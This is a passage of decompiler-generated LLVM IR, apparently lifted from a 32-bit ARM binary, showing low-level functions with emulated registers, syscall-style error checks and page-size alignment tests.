  store i1 %v2_15c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c50, label %dec_label_pc_15c58, label %dec_label_pc_15c34

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c4c, %dec_label_pc_15c28
  store i32 %v2_15bc4, i32* %r0.global-to-local, align 4
  %v1_15c5c = call i32 @function_18064(i32 %v2_15bc4)
  store i32 %v1_15c5c, i32* @r0, align 4
  %v1_15c60 = call i32 @function_15b30(i32 %v1_15c5c)
  store i32 %v1_15c60, i32* @r0, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_15c6c = load i32, i32* @r6, align 4
  %v2_15c6c = add i32 %v0_15c6c, 92
  %v3_15c6c = inttoptr i32 %v2_15c6c to i32*
  %v4_15c6c = load i32, i32* %v3_15c6c, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_15c74 = icmp eq i32 %tmp53, 0
  store i1 %v2_15c74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c74, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_15c58
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_15c58, %bb61
  %v0_15c80 = phi i32 [ %tmp53, %dec_label_pc_15c58 ], [ 4096, %bb61 ]
  %v3_15c7c = icmp eq i32 %tmp52, -1
  %v8_15c7c = icmp eq i32 %tmp52, -1
  store i1 %v8_15c7c, i1* %cpsr_z.global-to-local, align 1
  %v2_15c80 = inttoptr i32 %v4_15c6c to i32*
  store i32 %v0_15c80, i32* %v2_15c80, align 4
  br i1 %v3_15c7c, label %dec_label_pc_15c88, label %dec_label_pc_15cb0

dec_label_pc_15c88:                               ; preds = %bb62
  %v0_15c88 = call i32 @function_15fa0()
  store i32 %v0_15c88, i32* @r0, align 4
  store i32 %v0_15c88, i32* @r4, align 4
  %v0_15c90 = call i32 @function_15ffc()
  store i32 %v0_15c90, i32* @r0, align 4
  %v0_15c94 = load i32, i32* @r4, align 4
  %v9_15c94 = icmp eq i32 %v0_15c94, %v0_15c90
  store i1 %v9_15c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15c94, label %dec_label_pc_15c9c, label %dec_label_pc_15cd8

dec_label_pc_15c9c:                               ; preds = %dec_label_pc_15c88
  %v1_15c9c = call i32 @function_16168(i32 %v0_15c90)
  store i32 %v1_15c9c, i32* @r0, align 4
  store i32 %v1_15c9c, i32* @r4, align 4
  %v0_15ca4 = call i32 @function_15fe8()
  store i32 %v0_15ca4, i32* @r0, align 4
  %v0_15ca8 = load i32, i32* @r4, align 4
  %v9_15ca8 = icmp eq i32 %v0_15ca8, %v0_15ca4
  store i1 %v9_15ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15ca8, label %dec_label_pc_15cb0, label %dec_label_pc_15cd8

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15c9c, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_15c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15c7c, label %dec_label_pc_15cfc, label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15cb0
  store i32 %tmp51, i32* @r3, align 4
  %v9_15cc0 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_15cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15cc0, label %dec_label_pc_15cc8, label %dec_label_pc_15cd8

dec_label_pc_15cc8:                               ; preds = %dec_label_pc_15cbc
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_15cd0 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_15cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15cd0, label %dec_label_pc_15cfc, label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cbc, %dec_label_pc_15c9c, %dec_label_pc_15c88, %dec_label_pc_15cc8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_15ce0 = call i32 @function_15adc(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15cec = call i32 @function_15adc(i32 1, i32 32770)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15cf8 = call i32 @function_15adc(i32 2, i32 32770)
  store i32 %v2_15cf8, i32* @r0, align 4
  br label %dec_label_pc_15cfc

dec_label_pc_15cfc:                               ; preds = %dec_label_pc_15cc8, %dec_label_pc_15cb0, %dec_label_pc_15cd8
  %v0_15cfc = load i32, i32* @r7, align 4
  %v1_15cfc = inttoptr i32 %v0_15cfc to i32*
  %v2_15cfc = load i32, i32* %v1_15cfc, align 4
  store i32 %v2_15cfc, i32* %r2.global-to-local, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  %v1_15d04 = load i32, i32* @r6, align 4
  %v3_15d04 = add i32 %v1_15d04, 208
  %v4_15d04 = inttoptr i32 %v3_15d04 to i32*
  store i32 %v2_15cfc, i32* %v4_15d04, align 4
  %v0_15d08 = load i32, i32* @r7, align 4
  %v1_15d08 = inttoptr i32 %v0_15d08 to i32*
  %v2_15d08 = load i32, i32* %v1_15d08, align 4
  store i32 %v2_15d08, i32* @r4, align 4
  %v2_15d0c = icmp eq i32 %v2_15d08, 0
  store i1 %v2_15d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d0c, label %dec_label_pc_15db0.lr.ph, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15cfc
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_15d18 = load i32, i32* @r6, align 4
  %v2_15d18 = add i32 %v0_15d18, 112
  %v3_15d18 = inttoptr i32 %v2_15d18 to i32*
  %v4_15d18 = load i32, i32* %v3_15d18, align 4
  store i32 %v4_15d18, i32* %r3.global-to-local, align 4
  %v2_15d1c = inttoptr i32 %v4_15d18 to i32*
  store i32 %v2_15d08, i32* %v2_15d1c, align 4
  %v0_15d24 = load i32, i32* @r7, align 4
  %v1_15d24 = inttoptr i32 %v0_15d24 to i32*
  %v2_15d24 = load i32, i32* %v1_15d24, align 4
  store i32 %v2_15d24, i32* %r0.global-to-local, align 4
  %v4_15d28 = call i32 @function_17ca0(i32 %v2_15d24, i32 47, i32 %v2_15cfc, i32 %v4_15d18)
  store i32 %v4_15d28, i32* @r0, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_15d30 = icmp eq i32 %v4_15d28, 0
  store i1 %v2_15d30, i1* %cpsr_z.global-to-local, align 1
  %v0_15d34 = load i32, i32* @r6, align 4
  %v2_15d34 = add i32 %v0_15d34, 60
  %v3_15d34 = inttoptr i32 %v2_15d34 to i32*
  %v4_15d34 = load i32, i32* %v3_15d34, align 4
  store i32 %v4_15d34, i32* %r2.global-to-local, align 4
  br i1 %v2_15d30, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_15d14
  %v2_15d3c47 = inttoptr i32 %v4_15d34 to i32*
  store i32 0, i32* %v2_15d3c47, align 4
  br label %dec_label_pc_15db0.lr.ph

bb63:                                             ; preds = %dec_label_pc_15d14
  %v2_15d38 = add i32 %v4_15d28, 1
  store i32 %v2_15d38, i32* %r3.global-to-local, align 4
  %v2_15d3c = inttoptr i32 %v4_15d34 to i32*
  store i32 %v4_15d28, i32* %v2_15d3c, align 4
  %v1_15d40 = load i32, i32* %r3.global-to-local, align 4
  %v2_15d40 = load i32, i32* %r2.global-to-local, align 4
  %v3_15d40 = inttoptr i32 %v2_15d40 to i32*
  store i32 %v1_15d40, i32* %v3_15d40, align 4
  br label %dec_label_pc_15db0.lr.ph

dec_label_pc_15db0.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_15cfc
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_15d58 = load i32, i32* @r6, align 4
  %v2_15d58 = add i32 %v0_15d58, -12
  store i32 %v2_15d58, i32* %r8.global-to-local, align 4
  store i32 712, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_21378.635, align 4
  %v2_15d88 = icmp eq i32 %v0_15be4, 0
  store i1 %v2_15d88, i1* %cpsr_z.global-to-local, align 1
  %v2_15d90 = xor i1 %v2_15d88, true
  call void @__pseudo_cond_branch(i1 %v2_15d90, i32 %v0_15be4)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_15da4 = load i32, i32* @r6, align 4
  %v2_15da4 = add i32 %v0_15da4, -12
  store i32 %v2_15da4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15db0

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15db0.dec_label_pc_15db0_crit_edge, %dec_label_pc_15db0.lr.ph
  %v1_15db0 = phi i32 [ %v1_15dbc, %dec_label_pc_15db0.dec_label_pc_15db0_crit_edge ], [ 0, %dec_label_pc_15db0.lr.ph ]
  %v0_15db0 = phi i32 [ %v0_15db0.pre, %dec_label_pc_15db0.dec_label_pc_15db0_crit_edge ], [ %v2_15da4, %dec_label_pc_15db0.lr.ph ]
  %v4_15db0 = mul i32 %v1_15db0, 4
  %v5_15db0 = add i32 %v4_15db0, %v0_15db0
  %v6_15db0 = inttoptr i32 %v5_15db0 to i32*
  %v7_15db0 = load i32, i32* %v6_15db0, align 4
  store i32 %v7_15db0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15db0)
  %v0_15dbc = load i32, i32* %r4.global-to-local, align 4
  %v1_15dbc = add i32 %v0_15dbc, 1
  store i32 %v1_15dbc, i32* %r4.global-to-local, align 4
  %v1_15dc0 = load i32, i32* %r5.global-to-local, align 4
  %v3_15dc0 = icmp ult i32 %v1_15dbc, %v1_15dc0
  %v9_15dc0 = icmp eq i32 %v1_15dbc, %v1_15dc0
  store i1 %v9_15dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15dc0, label %dec_label_pc_15db0.dec_label_pc_15db0_crit_edge, label %dec_label_pc_15dc8

dec_label_pc_15db0.dec_label_pc_15db0_crit_edge:  ; preds = %dec_label_pc_15db0
  %v0_15db0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15db0

dec_label_pc_15dc8:                               ; preds = %dec_label_pc_15db0
  %v0_15dcc.pre = load i32, i32* @r6, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_15dcc = add i32 %v0_15dcc.pre, 104
  %v3_15dcc = inttoptr i32 %v2_15dcc to i32*
  %v4_15dcc = load i32, i32* %v3_15dcc, align 4
  store i32 %v4_15dcc, i32* %r2.global-to-local, align 4
  store i32 %v4_15dcc, i32* %r3.global-to-local, align 4
  %v2_15dd4 = icmp eq i32 %v4_15dcc, 0
  store i1 %v2_15dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15dd4, label %dec_label_pc_15dec, label %dec_label_pc_15ddc

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dc8
  call void @__pseudo_branch(i32 %v4_15dcc)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15de8 = load i32, i32* @r0, align 4
  %v2_15de8 = inttoptr i32 %v1_15de8 to i32*
  store i32 0, i32* %v2_15de8, align 4
  %v0_15df0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15dec

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15dc8, %dec_label_pc_15ddc
  %v0_15df0 = phi i32 [ %v0_15dcc.pre, %dec_label_pc_15dc8 ], [ %v0_15df0.pre, %dec_label_pc_15ddc ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_15df0 = add i32 %v0_15df0, 80
  %v3_15df0 = inttoptr i32 %v2_15df0 to i32*
  %v4_15df0 = load i32, i32* %v3_15df0, align 4
  store i32 %v4_15df0, i32* %r2.global-to-local, align 4
  store i32 %v4_15df0, i32* %r3.global-to-local, align 4
  %v2_15df8 = icmp eq i32 %v4_15df0, 0
  store i1 %v2_15df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15df8, label %dec_label_pc_15e10, label %dec_label_pc_15e00

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15dec
  call void @__pseudo_branch(i32 %v4_15df0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15e0c = load i32, i32* @r0, align 4
  %v2_15e0c = inttoptr i32 %v1_15e0c to i32*
  store i32 0, i32* %v2_15e0c, align 4
  %v0_15e14.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15dec, %dec_label_pc_15e00
  %v0_15e14 = phi i32 [ %v0_15df0, %dec_label_pc_15dec ], [ %v0_15e14.pre, %dec_label_pc_15e00 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_15e14 = add i32 %v0_15e14, 28
  %v3_15e14 = inttoptr i32 %v2_15e14 to i32*
  %v4_15e14 = load i32, i32* %v3_15e14, align 4
  store i32 %v4_15e14, i32* %r3.global-to-local, align 4
  %v1_15e1c = inttoptr i32 %v4_15e14 to i32*
  %v2_15e1c = load i32, i32* %v1_15e1c, align 4
  store i32 %v2_15e1c, i32* %r2.global-to-local, align 4
  %v0_15e20 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15e20, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_15e2c = call i32 @function_15194(i32 %v0_15e20)
  store i32 %v1_15e2c, i32* %r0.global-to-local, align 4
  %v0_15e30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e30, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_15e10
  %v4_15e30 = inttoptr i32 %v1_15e2c to i32*
  store i32 %arg1, i32* %v4_15e30, align 4
  %v5_15e30 = load i32, i32* %r8.global-to-local, align 4
  %v6_15e30 = load i32, i32* %r0.global-to-local, align 4
  %v7_15e30 = sub i32 %v6_15e30, %v5_15e30
  %v2_15e34 = load i32, i32* %r4.global-to-local, align 4
  %v8_15e34 = shl i32 %v2_15e34, %v7_15e30
  %v9_15e34 = and i32 %v8_15e34, %v7_15e30
  %v2_15e38 = load i32, i32* %ip.global-to-local, align 4
  %v8_15e38 = shl i32 %v2_15e38, %v9_15e34
  %v5_15e3c = sdiv i32 %v2_15e38, 32
  %v9_15e38 = and i32 %v5_15e3c, %v9_15e34
  %v6_15e3c = and i32 %v9_15e38, %v8_15e38
  %v8_15e40 = ashr i32 %v2_15e38, %v6_15e3c
  %v9_15e40 = and i32 %v8_15e40, %v6_15e3c
  %v2_15e44 = load i32, i32* %r2.global-to-local, align 4
  %v3_15e44 = and i32 %v9_15e40, %v2_15e44
  store i32 %v3_15e44, i32* %r8.global-to-local, align 4
  %v2_15e48 = inttoptr i32 %v9_15e40 to i64*
  %v3_15e48 = load i64, i64* %v2_15e48, align 4
  %v6_15e48 = udiv i64 %v3_15e48, 4294967296
  %v7_15e48 = trunc i64 %v6_15e48 to i32
  %v9_15e48 = sub i32 %v7_15e48, %v9_15e40
  %v5_15e4c = sub i32 32, %v9_15e48
  %v6_15e4c = shl i32 %v9_15e48, %v5_15e4c
  %v9_15e4c = and i32 %v6_15e4c, %v9_15e48
  %v8_15e50 = lshr i32 %v2_15e38, %v9_15e4c
  %v9_15e50 = and i32 %v8_15e50, %v9_15e4c
  store i32 %v9_15e50, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15e10, %bb64
  %v10_15e50 = phi i32 [ %v1_15e2c, %dec_label_pc_15e10 ], [ %v9_15e50, %bb64 ]
  ret i32 %v10_15e50

; uselistorder directives
  uselistorder i32 %v9_15e40, { 2, 1, 0 }
  uselistorder i32 %v2_15e38, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15dcc.pre, { 1, 0 }
  uselistorder i32 %v1_15dc0, { 1, 0 }
  uselistorder i32 %v1_15dbc, { 3, 2, 1, 0 }
  uselistorder i32 %v4_15d34, { 1, 0, 2 }
  uselistorder i1 %v8_15c7c, { 1, 2, 0 }
  uselistorder i32 %v2_15c4c, { 1, 2, 0 }
  uselistorder i1 %v2_15c34, { 1, 0 }
  uselistorder i32 %v5_15c38, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15c18, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v2_15bc4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15bb4, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 1, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 5, 6, 7, 8, 9, 10, 11, 3, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 8, 4, 0, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_15194, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 5, 6, 1, 7, 2, 8, 3, 9, 10, 4 }
  uselistorder i32 (i32, i32)* @function_15adc, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1, 3 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_15e10, { 1, 0 }
  uselistorder label %dec_label_pc_15dec, { 1, 0 }
  uselistorder label %dec_label_pc_15db0.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15cfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cd8, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_15c4c, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_15c34, { 1, 0 }
}

define i32 @function_15e70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_15e70:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15e70 = load i32, i32* @r4, align 4
  store i32 %v3_15e70, i32* %stack_var_-16, align 4
  %v3_15e7c = urem i32 %arg3, 4096
  %v2_15e80 = icmp eq i32 %v3_15e7c, 0
  br i1 %v2_15e80, label %dec_label_pc_15e9c, label %dec_label_pc_15e88

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e70
  %v0_15e88 = call i32 @function_13574()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15e94 = inttoptr i32 %v0_15e88 to i32*
  store i32 22, i32* %v2_15e94, align 4
  %v0_15ecc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15ecc

dec_label_pc_15e9c:                               ; preds = %dec_label_pc_15e70
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15ec8, label %dec_label_pc_15eb8

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15e9c
  %v0_15eb8 = call i32 @function_13574()
  %v0_15ebc = load i32, i32* %r4.global-to-local, align 4
  %v1_15ebc = sub i32 0, %v0_15ebc
  %v2_15ec0 = inttoptr i32 %v0_15eb8 to i32*
  store i32 %v1_15ebc, i32* %v2_15ec0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ec8

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15e9c, %dec_label_pc_15eb8
  %v0_15ec8 = phi i32 [ %arg1, %dec_label_pc_15e9c ], [ -1, %dec_label_pc_15eb8 ]
  store i32 %v0_15ec8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15ecc

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15e88, %dec_label_pc_15ec8
  %v0_15ecc = phi i32 [ %v0_15ecc.pre, %dec_label_pc_15e88 ], [ %v0_15ec8, %dec_label_pc_15ec8 ]
  %v2_15ed0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15ed0, i32* @r4, align 4
  ret i32 %v0_15ecc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ecc, { 1, 0 }
  uselistorder label %dec_label_pc_15ec8, { 1, 0 }
}

define i32 @function_15ed8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15ed8:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15ed8 = load i32, i32* @r4, align 4
  %v6_15ed8 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_15ee0 = icmp eq i32 %arg2, 0
  store i32 135344, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_15ee0, label %dec_label_pc_15f34, label %dec_label_pc_15ef8

dec_label_pc_15ef8:                               ; preds = %dec_label_pc_15ed8
  %v1_15ef8 = add i32 %arg2, 4
  %v2_15ef8 = inttoptr i32 %v1_15ef8 to i32*
  %v3_15ef8 = load i32, i32* %v2_15ef8, align 4
  store i32 %v3_15ef8, i32* @r3, align 4
  %v1_15efc = and i32 %v3_15ef8, 67108864
  %v2_15efc = icmp eq i32 %v1_15efc, 0
  br i1 %v2_15efc, label %dec_label_pc_15f04, label %dec_label_pc_15f34

dec_label_pc_15f04:                               ; preds = %dec_label_pc_15ef8
  store i32 20, i32* @r2, align 4
  %v2_15f08 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15f08, i32* @r0, align 4
  %v0_15f0c = call i32 @function_13680()
  store i32 %v2_15f08, i32* @ip, align 4
  %v0_15f34.pre = load i32, i32* @r5, align 4
  %v0_15f3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15ef8, %dec_label_pc_15ed8, %dec_label_pc_15f04
  %v0_15f3c = phi i32 [ %arg3, %dec_label_pc_15ef8 ], [ %arg3, %dec_label_pc_15ed8 ], [ %v0_15f3c.pre, %dec_label_pc_15f04 ]
  %v0_15f38 = phi i32 [ %arg2, %dec_label_pc_15ef8 ], [ 0, %dec_label_pc_15ed8 ], [ %v2_15f08, %dec_label_pc_15f04 ]
  %v0_15f34 = phi i32 [ %arg1, %dec_label_pc_15ef8 ], [ %arg1, %dec_label_pc_15ed8 ], [ %v0_15f34.pre, %dec_label_pc_15f04 ]
  store i32 8, i32* @r3, align 4
  %v4_15f44 = call i32 @function_16494(i32 %v0_15f34, i32 %v0_15f38, i32 %v0_15f3c, i32 8)
  store i32 %v3_15ed8, i32* @r4, align 4
  store i32 %v6_15ed8, i32* @r5, align 4
  ret i32 %v4_15f44

; uselistorder directives
  uselistorder label %dec_label_pc_15f34, { 2, 0, 1 }
}

define i32 @function_15f58(i32 %arg1) local_unnamed_addr {
dec_label_pc_15f58:
  %v0_15f58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15f58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15f58
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15f58, %bb
  %v0_15f6c = phi i32 [ %arg1, %dec_label_pc_15f58 ], [ 0, %bb ]
  ret i32 %v0_15f6c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15f78() local_unnamed_addr {
dec_label_pc_15f78:
  %v4_15f84 = load i32, i32* inttoptr (i32 135436 to i32*), align 4
  %v1_15f88 = inttoptr i32 %v4_15f84 to i32*
  %v2_15f88 = load i32, i32* %v1_15f88, align 4
  %v2_15f8c = icmp eq i32 %v2_15f88, 0
  br i1 %v2_15f8c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_15f78
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_15f78, %bb
  %v1_15f94 = phi i32 [ %v2_15f88, %dec_label_pc_15f78 ], [ 4096, %bb ]
  ret i32 %v1_15f94

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_15fa0() local_unnamed_addr {
dec_label_pc_15fa0:
  %v1_15fb0 = load i32, i32* @r0, align 4
  ret i32 %v1_15fb0
}

define i32 @function_15fb4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15fb4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15fb4 = load i32, i32* @r7, align 4
  store i32 %v3_15fb4, i32* %stack_var_-8, align 4
  %v0_15fc0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15fc0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15fc0, -4095
  br i1 %tmp, label %dec_label_pc_15fe0, label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fb4
  %v0_15fd0 = call i32 @function_13574()
  %v0_15fd4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15fd4 = sub i32 0, %v0_15fd4
  %v2_15fd8 = inttoptr i32 %v0_15fd0 to i32*
  store i32 %v1_15fd4, i32* %v2_15fd8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15fe0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15fe0

dec_label_pc_15fe0:                               ; preds = %dec_label_pc_15fb4, %dec_label_pc_15fd0
  %v1_15fe4 = phi i32 [ %v0_15fc0, %dec_label_pc_15fb4 ], [ -1, %dec_label_pc_15fd0 ]
  %v2_15fe0 = phi i32 [ %v3_15fb4, %dec_label_pc_15fb4 ], [ %v2_15fe0.pre, %dec_label_pc_15fd0 ]
  store i32 %v2_15fe0, i32* %r7.global-to-local, align 4
  ret i32 %v1_15fe4

; uselistorder directives
  uselistorder i32 %v0_15fc0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15fe0, { 1, 0 }
}

define i32 @function_15fe8() local_unnamed_addr {
dec_label_pc_15fe8:
  %v1_15ff8 = load i32, i32* @r0, align 4
  ret i32 %v1_15ff8
}

define i32 @function_15ffc() local_unnamed_addr {
dec_label_pc_15ffc:
  %v1_1600c = load i32, i32* @r0, align 4
  ret i32 %v1_1600c
}

define i32 @function_16010(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16010:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_16010 = load i32, i32* @r5, align 4
  %v18_16010 = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16040, label %dec_label_pc_1602c

dec_label_pc_1602c:                               ; preds = %dec_label_pc_16010
  %v0_1602c = call i32 @function_13574()
  %v0_16030 = load i32, i32* @r5, align 4
  %v1_16030 = sub i32 0, %v0_16030
  store i32 %v1_16030, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  %v2_16038 = inttoptr i32 %v0_1602c to i32*
  store i32 %v1_16030, i32* %v2_16038, align 4
  br label %dec_label_pc_16094

dec_label_pc_16040:                               ; preds = %dec_label_pc_16010
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16040
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_16048 = add i32 %arg2, %arg1
  store i32 %v3_16048, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16040, %bb
  %v1_160844 = phi i32 [ %v18_16010, %dec_label_pc_16040 ], [ %v3_16048, %bb ]
  %v0_160802 = phi i32 [ 141, %dec_label_pc_16040 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_16094, label %dec_label_pc_16080

dec_label_pc_16054:                               ; preds = %dec_label_pc_16080
  %v1_16054 = add i32 %v0_16054, 8
  %v2_16054 = inttoptr i32 %v1_16054 to i16*
  %v3_16054 = load i16, i16* %v2_16054, align 2
  %v4_16054 = zext i16 %v3_16054 to i32
  %v2_16058 = add i32 %v4_16054, %v0_16054
  store i32 %v2_16058, i32* %r3.global-to-local, align 4
  %v1_1605c = add i32 %v2_16058, -1
  %v2_1605c = inttoptr i32 %v1_1605c to i8*
  %v3_1605c = load i8, i8* %v2_1605c, align 1
  %v4_1605c = zext i8 %v3_1605c to i32
  store i32 %v4_1605c, i32* @r4, align 4
  %v1_16060 = call i32 @function_17b90(i32 %v1_16080)
  %v0_16064 = load i32, i32* %r6.global-to-local, align 4
